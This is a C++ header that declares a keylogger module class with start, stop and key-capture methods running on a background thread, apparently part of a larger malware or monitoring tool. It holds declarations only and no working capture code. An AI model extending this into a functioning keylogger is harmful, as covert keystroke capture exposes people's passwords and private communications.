#ifndef __KEY_MOD
#define __KEY_MOD

#include "headers.hpp"

class mod_Keylogger {
	public:
		mod_Keylogger();

		void Start();
		void Stop();
		void CaptureKeys();

	private:
		std::mutex mtx_Run;
		bool isRunning = false;
		std::thread thKey;
};

#endif
